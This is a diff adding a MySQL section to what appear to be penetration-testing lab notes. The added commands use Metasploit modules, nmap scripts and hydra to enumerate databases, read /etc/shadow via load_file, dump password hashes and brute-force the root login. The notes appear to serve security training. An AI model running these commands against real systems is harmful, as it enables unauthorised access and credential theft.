@@ -52,5 +52,54 @@ nmap --script smb-os-discovery.nse -p 445 192.126.66.3
 nmblookup -A 192.126.66.3
 smbclient -L 192.126.66.3 -N
 rpcclient -U "" -N 192.126.66.3
+```
+## MySQL 
+```
+mysql -h 192.71.145.3 -u root //connect to user account
+show databases; show databases
+msfconsole
+use auxiliary/scanner/mysql/mysql_schemadump
+set RHOSTS 192.71.145.3
+set USERNAME root
+set PASSWORD ""
+exploit
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set RHOSTS 192.71.145.3
+set VERBOSE false
+set PASSWORD ""
+exploit
+use auxiliary/scanner/mysql/mysql_file_enum
+set RHOSTS 192.71.145.3
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
+set PASSWORD ""
+exploit
+mysql -h 192.71.145.3 -u root
+select load_file("/etc/shadow");
+use auxiliary/scanner/mysql/mysql_hashdump
+set RHOSTS 192.71.145.3
+set USERNAME root
+set PASSWORD ""
+exploit
+nmap --script=mysql-empty-password -p 3306 192.71.145.3
+nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
+nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
+nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
+ nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.71.145.3
+nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.71.145.3
+```
+
+
+```
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.149.194.3
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set STOP_ON_SUCCESS true
+exploit
+
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.149.194.3 mysql
 
 ```
